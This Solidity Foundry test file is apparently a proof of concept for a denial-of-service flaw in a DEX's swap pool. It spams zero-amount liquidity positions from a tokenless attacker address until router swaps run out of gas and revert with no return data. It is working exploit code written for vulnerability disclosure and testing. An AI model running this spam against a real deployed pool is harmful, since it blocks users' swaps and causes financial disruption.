// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import {PoolBaseSetup} from "./PoolBaseSetup.sol";
import {Pool} from "../../src/swap/Pool.sol";
import {PositionManager} from "../../src/swap/PositionManager.sol";
import {SwapRouter} from "../../src/swap/SwapRouter.sol";
import {ISwapRouter} from "../../src/swap/interfaces/ISwapRouter.sol";
import {ExchangeOrderbook} from "../../src/exchange/libraries/ExchangeOrderbook.sol";
import {MockQuote} from "../../src/mock/MockQuote.sol";
import {console} from "forge-std/console.sol";

/// PoC for the "wagmi only shows a gas-limit error, never a custom error" class.
///
/// Pool._assembleInRangePositions runs MAX_POSITIONS_PER_SWAP (20) selection passes over
/// the WHOLE activeIds array. activeIds is unbounded, and growing it costs an attacker
/// nothing but gas: PositionManager.addLiquidity is permissionless and Pool.addLiquidity
/// accepts baseAmount == quoteAmount == 0, skipping both safeTransferFrom calls while
/// still doing activeIds.push. Swap gas therefore grows ~linearly in the number of live
/// positions with no cap and no revert of its own -- the swap dies out-of-gas, which
/// carries NO return data at all, so eth_estimateGas can only report "gas required
/// exceeds allowance" and there is nothing for viem/wagmi to decode.
///
/// Everything here runs through the PRODUCTION path: a real PositionManager, a real
/// SwapRouter, and an unprivileged attacker EOA holding no tokens.
contract PoCEstimateGasOnly is PoolBaseSetup {
    PositionManager pm;
    SwapRouter router;
    Pool victimPool;
    MockQuote victimQuote;
    address attacker = address(0xA77ACC);

    ISwapRouter.RemainderConfig empty;

    function setUp() public override {
        super.setUp();

        // Real PositionManager, wired the way production does (mirrors
        // Router.t.sol:_setupPositionManagerWithRouter). Pool bakes positionManager in at
        // initialize, so the pair must be listed AFTER the factory is pointed at it.
        pm = new PositionManager();
        pm.initialize("ipfs://poc/{id}.json");
        pm.setPoolFactory(address(poolFactory));
        poolFactory.setPositionManager(address(pm));

        router = new SwapRouter(address(poolFactory));
        pm.setRouter(address(router));
        matchingEngine.setSwapRouter(address(router));

        victimQuote = new MockQuote("Victim", "VQ");
        victimQuote.mint(trader1, 10000e18);
        victimQuote.mint(lp1, 10000e18);
        matchingEngine.addPair(
            address(token1), address(victimQuote), 1e8, 0, address(token1), ExchangeOrderbook.MatchingMode.PriceTimePriority
        );
        victimPool = Pool(poolFactory.getPool(address(token1), address(victimQuote)));
        vm.warp(block.timestamp + 600); // clear the TWAP window

        // One honest LP so the pool has real depth to swap against.
        vm.startPrank(lp1);
        token1.approve(address(victimPool), type(uint256).max);
        victimQuote.approve(address(victimPool), type(uint256).max);
        pm.addLiquidity(address(victimPool), 5e7, 15e7, 5000000, 1000e18, 1000e18);
        vm.stopPrank();

        vm.prank(trader1);
        victimQuote.approve(address(router), type(uint256).max);
    }

    /// The attacker holds no tokens and has no role. Each call mints them an ERC1155
    /// position token and appends an id to activeIds without moving a single token.
    function _spamFreePositions(uint256 count) internal returns (uint256 gasPerPosition) {
        uint256 g0 = gasleft();
        vm.startPrank(attacker);
        for (uint256 i = 0; i < count; i++) {
            pm.addLiquidity(address(victimPool), 5e7, 15e7, 5000000, 0, 0);
        }
        vm.stopPrank();
        gasPerPosition = (g0 - gasleft()) / count;
    }

    function _swapPath() internal view returns (address[] memory path) {
        path = new address[](2);
        path[0] = address(victimQuote);
        path[1] = address(token1);
    }

    function _routerSwapGas() internal returns (uint256 gasUsed) {
        uint256 g0 = gasleft();
        vm.prank(trader1);
        router.swap(
            ISwapRouter.SwapInput({
                path: _swapPath(),
                amountIn: 1e18,
                minAmountOut: 0,
                recipient: trader1,
                remainderMode: ISwapRouter.RemainderMode.Refund,
                remainderConfig: empty
            })
        );
        gasUsed = g0 - gasleft();
    }

    function test_PoC_attackerCanGrowSwapGasWithoutHoldingTokens() public {
        assertEq(token1.balanceOf(attacker), 0, "attacker holds no base");
        assertEq(victimQuote.balanceOf(attacker), 0, "attacker holds no quote");

        uint256 baseline = _routerSwapGas();

        uint256 costPerPosition = _spamFreePositions(500);
        uint256 with500 = _routerSwapGas();

        _spamFreePositions(1500); // 2000 attacker positions total
        uint256 with2000 = _routerSwapGas();

        console.log("attacker cost per position (gas):", costPerPosition);
        console.log("router swap gas, 1 position     :", baseline);
        console.log("router swap gas, 501 positions  :", with500);
        console.log("router swap gas, 2001 positions :", with2000);
        console.log("victim gas added per position   :", (with2000 - baseline) / 2000);

        assertEq(token1.balanceOf(attacker), 0, "attacker still holds no base");
        assertEq(victimQuote.balanceOf(attacker), 0, "attacker still holds no quote");
        assertEq(victimPool.activePositionsLength(), 2001, "all attacker positions are live");
        assertGt(with2000, baseline * 10, "swap gas grows unboundedly with activeIds");
    }

    /// The failure the frontend actually sees: capped gas, empty returndata.
    /// No custom error, no Error(string), no Panic -- literally zero bytes.
    function test_PoC_revertCarriesNoReturnDataAtAll() public {
        _spamFreePositions(4000);

        // encodeCall, not encodeWithSelector, and the distinction is load-bearing HERE in a
        // way it is not everywhere: this test asserts that the revert carries zero bytes of
        // return data. Calldata the router cannot decode also reverts with zero bytes, so
        // hand-encoded positional arguments would keep this test green while testing
        // nothing at all. encodeCall makes the compiler check the shape.
        bytes memory callData = abi.encodeCall(
            ISwapRouter.swap,
            (
                ISwapRouter.SwapInput({
                    path: _swapPath(),
                    amountIn: uint256(1e18),
                    minAmountOut: uint256(0),
                    recipient: trader1,
                    remainderMode: ISwapRouter.RemainderMode.Refund,
                    remainderConfig: empty
                })
            )
        );

        // ~7.4M is what this swap now needs (366k base + 4000 x 1,765). A wallet that
        // offers less -- and eth_estimateGas binary-searching from below always will --
        // runs the OUTERMOST frame out of gas.
        vm.prank(trader1);
        (bool ok, bytes memory ret) = address(router).call{gas: 2_000_000}(callData);

        assertFalse(ok, "swap should fail");
        assertEq(ret.length, 0, "revert data must be empty (out-of-gas), i.e. nothing to decode");
        console.log("returndata length on failure:", ret.length);
    }
}
